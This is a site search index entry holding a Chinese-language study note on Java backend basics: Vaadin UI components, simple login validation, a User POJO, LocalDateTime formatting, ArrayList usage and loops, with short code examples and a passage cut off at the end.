<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java拓展（偏后端）</title>
      <link href="/2025/03/05/Java%E6%8B%93%E5%B1%95%EF%BC%88%E5%81%8F%E5%90%8E%E7%AB%AF%EF%BC%89/"/>
      <url>/2025/03/05/Java%E6%8B%93%E5%B1%95%EF%BC%88%E5%81%8F%E5%90%8E%E7%AB%AF%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Vaadin"><a href="#Vaadin" class="headerlink" title="Vaadin"></a>Vaadin</h1><p>是一个优秀的web组件框架，可以使用Java后端语言编写前端页面</p><h2 id="TextField"><a href="#TextField" class="headerlink" title="TextField"></a>TextField</h2><p>完整类路径：<code>com.vaadin.flow.component.textfield.TextField</code>​</p><p>实例化：<code>TextField field = new TextField();</code>​</p><p>可以写上import+类路径，也可以在Maven里选择自动添加</p><p>以下是拓展用法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文本框的名字</span></span><br><span class="line">setLabel(String label)</span><br><span class="line"><span class="comment">//文本框填充的信息</span></span><br><span class="line">setPlaceholder(String placeholder)</span><br><span class="line">setValue(String value)</span><br></pre></td></tr></table></figure><p>效果如下：</p><p>​<img src="/Java%E5%90%8E%E7%AB%AF/image-20250220162133-tnej10g.png" alt="image">​</p><h2 id="水平与垂直布局"><a href="#水平与垂直布局" class="headerlink" title="水平与垂直布局"></a>水平与垂直布局</h2><p>垂直：<code>com.vaadin.flow.component.orderedlayout.VerticalLayout</code>​</p><p>水平：<code>com.vaadin.flow.component.orderedlayout.HorizontalLayout</code>​</p><p>只需记住垂直布局是v开头，水平是h开头即可</p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vaadin.marcus.spring;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.flow.component.orderedlayout.VerticalLayout;</span><br><span class="line"><span class="comment">// Todo 继承于 VerticalLayout </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Todo</span> <span class="keyword">extends</span> <span class="title class_">VerticalLayout</span> &#123;  &#125;</span><br></pre></td></tr></table></figure><p>通过继承，ToDo类就具备了VerticalLayout这个垂直布局容器的特性</p><h2 id="add方法"><a href="#add方法" class="headerlink" title="add方法"></a>add方法</h2><p>add方法可以添加任意个子组件，如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TextField</span> <span class="variable">field</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>();</span><br><span class="line">add(field); <span class="comment">//add变量名称</span></span><br><span class="line"><span class="comment">//可同时添加多个组件</span></span><br><span class="line">add(field,button,good);</span><br></pre></td></tr></table></figure><h2 id="Button按钮"><a href="#Button按钮" class="headerlink" title="Button按钮"></a>Button按钮</h2><p>完整类路径：<code>com.vaadin.flow.component.button.Button</code>​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个保存按钮对象</span></span><br><span class="line"><span class="type">Button</span> <span class="variable">addButton</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>();</span><br><span class="line"><span class="comment">// 在当前布局里添加按钮实例</span></span><br><span class="line">add(addButton);</span><br><span class="line"><span class="comment">//给按钮设置文本</span></span><br><span class="line">addButton.setText(<span class="string">&quot;单击此处&quot;</span>);</span><br><span class="line"><span class="comment">//(或者直接在创建的时候进行赋值)</span></span><br><span class="line"><span class="type">Button</span> <span class="variable">addButton</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;单击此处&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="Lambda表达式"><a href="#Lambda表达式" class="headerlink" title="Lambda表达式"></a>Lambda表达式</h2><p>Lambda表达式也可以成为闭包，允许把函数作为一个方法的参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">loginButton</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;Login&quot;</span>);</span><br><span class="line"><span class="comment">// 给 loginButton 添加一个点击事件</span></span><br><span class="line">loginButton.addClickListener(click-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>更复杂一点，涉及到了一些新的方法getValue</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置点击事件</span></span><br><span class="line">loginButton.addClickListener(click -&gt; &#123;</span><br><span class="line"><span class="comment">//使用getValue函数获取输入的内容</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">userNameText</span> <span class="operator">=</span> userNameField.getValue();</span><br><span class="line">    <span class="type">String</span> <span class="variable">pwdText</span> <span class="operator">=</span> passwordField.getValue();</span><br><span class="line"><span class="comment">//通过加号将变量与字符串进行组合</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> userNameText + <span class="string">&quot;/&quot;</span> + pwdText + <span class="string">&quot; login &quot;</span> + <span class="string">&quot; success&quot;</span>;</span><br><span class="line">    System.out.println(text);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>再拓展一下equals方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">loginButton.addClickListener(click -&gt; &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">userNameText</span> <span class="operator">=</span> userNameField.getValue();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;admin&quot;</span>.equals(userNameText))&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;用户名正确&quot;</span>);</span><br><span class="line">   &#125;&#125;);</span><br></pre></td></tr></table></figure><p>新学：userNameText &#x3D;&#x3D; null以及””.equals(userNameText)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Notification</span> <span class="variable">notification</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Notification</span>();</span><br><span class="line"><span class="comment">// 只要满足任何一个条件逻辑就成立，使用 || 用来表示或者的关系</span></span><br><span class="line"><span class="comment">//  userNameText == null 用来判断对象是否为 null，这个是java常用的判断条件</span></span><br><span class="line"><span class="comment">// &quot;&quot;.equals(userNameText) 用来判断是否为空内容</span></span><br><span class="line"><span class="keyword">if</span>(userNameText == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(userNameText))&#123;</span><br><span class="line">  notification.setText(<span class="string">&quot;need input username&quot;</span>);</span><br><span class="line">  notification.open();</span><br><span class="line">  <span class="comment">// 程序执行到这就结束，后面的代码不再执行</span></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// 如果密码有输入并且密码等于确认密码的值</span></span><br><span class="line"><span class="keyword">if</span> (pwdText != <span class="literal">null</span> &amp;&amp; !<span class="string">&quot;&quot;</span>.equals(pwdText) &amp;&amp; pwdText.equals(confirmPwdText)) &#123;</span><br><span class="line">  notification.setText(<span class="string">&quot;reg success&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  notification.setText(<span class="string">&quot;confirm pwd error&quot;</span>);  </span><br><span class="line">&#125;</span><br><span class="line">notification.open();</span><br></pre></td></tr></table></figure><h2 id="Notification"><a href="#Notification" class="headerlink" title="Notification"></a>Notification</h2><p>如果再点击事件中使用System.out.printIn()，信息便只能在后台看见，如果想要让用户看到的话，就要用到Notidfication组件</p><p>几个重要方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">loginButton</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(text: <span class="string">&quot;Login&quot;</span>);</span><br><span class="line"><span class="type">Notification</span> <span class="variable">notification</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Notification</span>();</span><br><span class="line">loginButton.addClickListener(click -&gt; &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">userNameText</span> <span class="operator">=</span> userNameField.getValue();</span><br><span class="line">    <span class="type">String</span> <span class="variable">pwdText</span> <span class="operator">=</span> passwordField.getValue();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;admin&quot;</span>.equals(userNameText) &amp;&amp; <span class="string">&quot;admin&quot;</span>.equals(pwdText)) &#123;</span><br><span class="line"><span class="comment">//setText()，用于设置提示的文本</span></span><br><span class="line">        notification.setText(<span class="string">&quot;login success&quot;</span>);</span><br><span class="line"><span class="comment">//setDuration()，用于设置开启的时间</span></span><br><span class="line">        notification.setDuration(<span class="number">3000</span>);</span><br><span class="line"><span class="comment">//open()，用于开启提示框</span></span><br><span class="line">        notification.open();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        notification.setText(<span class="string">&quot;login error&quot;</span>);</span><br><span class="line">        notification.setDuration(<span class="number">3000</span>);</span><br><span class="line">        notification.open();</span><br><span class="line">    &#125;&#125;);</span><br></pre></td></tr></table></figure><h2 id="自定义方法、注解"><a href="#自定义方法、注解" class="headerlink" title="自定义方法、注解"></a>自定义方法、注解</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// public（公共的） </span></span><br><span class="line"><span class="keyword">public</span>  返回类型 方法名称(方法参数)&#123;</span><br><span class="line">  代码块 &#125;</span><br></pre></td></tr></table></figure><p>注解：可以实现多页面，格式为@Route( )</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.vaadin.flow.router.Route;</span><br><span class="line"><span class="comment">// 斜杠/是默认页面，如果要切换成其他页面，可以更改斜杠里面的内容</span></span><br><span class="line"><span class="meta">@Route(&quot;/&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Todo</span> <span class="keyword">extends</span> <span class="title class_">VerticalLayout</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>‍</p><h1 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h1><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>在上面完成了用户的数据存储之后，就需要用到封装</p><p>把一个真实的用户信息抽象成Java的User对象</p><p><strong>封装事物的类对象，一般会存放在xxx.model的子包里面，一般把封装的对象称为POJO类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Z41sArrebol</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2025/2/22</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"><span class="comment">//注意属性private</span></span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"><span class="comment">//以下内容可以采用ide工具 getter与setter生成</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUserName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserName</span><span class="params">(String userName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userName = userName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LocalDateTime"><a href="#LocalDateTime" class="headerlink" title="LocalDateTime"></a>LocalDateTime</h2><p>在 Java 当中，有两种时间日期类型，一种是 Java8 以前用的 Date，一种是 Java8 以后主推的 LocalDateTime</p><ul><li>​<code>java.time.LocalDate</code>​ 表示日期 比如 2025-02-20，像出生年月日这种的就可以使用</li><li>​<code>java.time.LocalTime</code>​ 表示时间 比如 12:30:00，像几点的会议就可以使用</li><li>​<code>java.time.LocalDateTime</code>​ 表示日期和时间 比如 2025-02-20 12:30:00，像报名时间、注册时间之类的就可以使用</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">日期：yyyy-MM-dd</span><br><span class="line">时间：HH:mm:ss</span><br><span class="line">带毫秒的时间：HH:mm:ss.SSS</span><br><span class="line">日期和时间：yyyy-MM-dd<span class="string">&#x27;T&#x27;</span>HH:mm:ss</span><br><span class="line">带毫秒的日期和时间：yyyy-MM-dd<span class="string">&#x27;T&#x27;</span>HH:mm:ss.SSS</span><br></pre></td></tr></table></figure><p>借助<code>java.time.format.DateTimeFormatter</code>​来规范格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vaadin.marcus.spring;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Z41sArrebol</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2025/2/22</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LocalDateTimeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line"><span class="comment">//调用方法打印当前时间  </span></span><br><span class="line">        <span class="type">LocalTime</span> <span class="variable">t1</span> <span class="operator">=</span> LocalTime.now();</span><br><span class="line">        System.out.println(t1);</span><br><span class="line">        <span class="type">LocalDateTime</span> <span class="variable">now</span> <span class="operator">=</span> LocalDateTime.now();</span><br><span class="line">        System.out.println(now);</span><br><span class="line"><span class="comment">//规范格式（这里dtf是一个样式的名称）</span></span><br><span class="line">        <span class="type">DateTimeFormatter</span> <span class="variable">dtf</span> <span class="operator">=</span> DateTimeFormatter.ofPattern(<span class="string">&quot;yyyy/MM/dd HH:mm:ss&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">nowStr</span> <span class="operator">=</span> dtf.format(now);</span><br><span class="line">        System.out.println(nowStr);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;2021-05-01 21:30:00&quot;</span>;</span><br><span class="line"><span class="comment">//parse:将原有的日期按照一个样式进行转化，这里用的日期是str1，格式是dtf</span></span><br><span class="line">        <span class="type">LocalDateTime</span> <span class="variable">time</span> <span class="operator">=</span> LocalDateTime.parse(str1, dtf);</span><br><span class="line">        System.out.println(time);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意日期必须标准，如2025-02-23而不是2025-2-23，0不能省</p><p>相关方法还有：</p><p>​<code>time.toString()</code>​把time的数据变成字符串</p><p>​<code>plusDays(天数) </code>​执行天数的相加</p><p>如：<code>LocalDate leaveTime = time.plusDays(days);</code>​</p><p>还有更多计算：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.time.LocalDate;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DateTest10</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">LocalDate</span> <span class="variable">now</span> <span class="operator">=</span> LocalDate.now();</span><br><span class="line">    System.out.println(<span class="string">&quot;当前：&quot;</span> + now.toString());</span><br><span class="line">    System.out.println(<span class="string">&quot;加法运算&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;加1天：&quot;</span> + now.plusDays(<span class="number">1</span>));</span><br><span class="line">    System.out.println(<span class="string">&quot;加1周：&quot;</span> + now.plusWeeks(<span class="number">1</span>));</span><br><span class="line">    System.out.println(<span class="string">&quot;加1月：&quot;</span> + now.plusMonths(<span class="number">1</span>));</span><br><span class="line">    System.out.println(<span class="string">&quot;加1年：&quot;</span> + now.plusYears(<span class="number">1</span>));</span><br><span class="line">    System.out.println(<span class="string">&quot;减法运算&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;减1天：&quot;</span> + now.minusDays(<span class="number">1</span>));</span><br><span class="line">    System.out.println(<span class="string">&quot;减1周：&quot;</span> + now.minusWeeks(<span class="number">1</span>));</span><br><span class="line">    System.out.println(<span class="string">&quot;减1月：&quot;</span> + now.minusMonths(<span class="number">1</span>));</span><br><span class="line">    System.out.println(<span class="string">&quot;减1年：&quot;</span> + now.minusYears(<span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.time.LocalDate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DateTest11</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">LocalDate</span> <span class="variable">now</span> <span class="operator">=</span> LocalDate.now();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以对两个 LocalDate 进行比较，</span></span><br><span class="line">    <span class="comment">// 可以判断一个日期是否在另一个日期之前或之后，</span></span><br><span class="line">    <span class="comment">// 或者判断两个日期是否是同年同月同日。</span></span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isBefore</span> <span class="operator">=</span> now.minusDays(<span class="number">1</span>).isBefore(LocalDate.now());</span><br><span class="line">    System.out.println(<span class="string">&quot;是否在当天之前：&quot;</span> + isBefore);</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isAfter</span> <span class="operator">=</span> now.plusDays(<span class="number">1</span>).isAfter(LocalDate.now());</span><br><span class="line">    System.out.println(<span class="string">&quot;是否在当天之后：&quot;</span> + isAfter);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断是否是当天</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">sameDate</span> <span class="operator">=</span> now.isEqual(LocalDate.now());</span><br><span class="line">    System.out.println(<span class="string">&quot;是否在当天：&quot;</span> + sameDate);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="集合，接口"><a href="#集合，接口" class="headerlink" title="集合，接口"></a>集合，接口</h2><p>接口在JAVA编程语言中是一个抽象类型，是抽象方法的集合，接口通常以interface来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。</p><p>ArrayList继承了AbstractList，并实现了java.util.List接口</p><p>java.util.List有几个最常用的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index,E element)</span>:将指定的元素，添加到该集合中的指定位置上。</span><br><span class="line"><span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span>:返回集合中指定位置的元素。</span><br><span class="line"><span class="keyword">public</span> E <span class="title function_">remove</span><span class="params">(<span class="type">int</span> index)</span>:移除列表中指定位置的元素，返回的是被移除的元素。</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span>:取得集合里元素的个数，list.size( );</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span>:删除所有元素,list.clear();</span><br></pre></td></tr></table></figure><p>在 Java 当中接口是不能直接被实例化的，所以如果想要创建一个接口类型的变量，得需要 new 实现类。<code>java.util.List</code>​ 接口的实现类一般会用 <code>java.util.ArrayList</code>​</p><p>比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个字符串集合，用于存储多个字符串</span></span><br><span class="line">List&lt;String&gt; strings = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="comment">// 创建一个用户集合，用于存储多个用户信息</span></span><br><span class="line">List&lt;User&gt; users = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vaadin.marcus.spring;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;String&gt; userName = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;String&gt; password = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        userName.add(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        password.add(<span class="string">&quot;admin123&quot;</span>);</span><br><span class="line">        userName.add(<span class="string">&quot;nb&quot;</span>);</span><br><span class="line">        password.add(<span class="string">&quot;nb123&quot;</span>);</span><br><span class="line">        userName.add(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        password.add(<span class="string">&quot;test123&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">userName1</span> <span class="operator">=</span> userName.get(<span class="number">2</span>);</span><br><span class="line">        System.out.println(userName1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vaadin.marcus.spring;</span><br><span class="line"><span class="keyword">import</span> org.vaadin.marcus.spring.model.Score;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;Score&gt; scores = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="comment">//&lt;Score&gt;是类名，下面的操作是在进行实例化</span></span><br><span class="line">        <span class="type">Score</span> <span class="variable">score</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Score</span>();</span><br><span class="line">        score.setName(<span class="string">&quot;joe&quot;</span>);</span><br><span class="line">        score.setScore(<span class="number">80.0</span>);</span><br><span class="line">        scores.add(score);</span><br><span class="line"></span><br><span class="line">        score = <span class="keyword">new</span> <span class="title class_">Score</span>();</span><br><span class="line">        score.setName(<span class="string">&quot;alice&quot;</span>);</span><br><span class="line">        score.setScore(<span class="number">87.0</span>);</span><br><span class="line">        scores.add(score);</span><br><span class="line"></span><br><span class="line">        score = <span class="keyword">new</span> <span class="title class_">Score</span>();</span><br><span class="line">        score.setName(<span class="string">&quot;hali&quot;</span>);</span><br><span class="line">        score.setScore(<span class="number">70.0</span>);</span><br><span class="line">        scores.add(score);</span><br><span class="line"><span class="comment">//这里为什么不需要创建多个变量score123呢，因为每次score的值被更新之后，就被上传了，再被更新</span></span><br><span class="line">        <span class="type">Double</span> <span class="variable">total</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Score score1 : scores) &#123;</span><br><span class="line">            total += score1.getScore();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(total);</span><br><span class="line">        System.out.println(total/scores.size());</span><br><span class="line">    &#125;</span><br><span 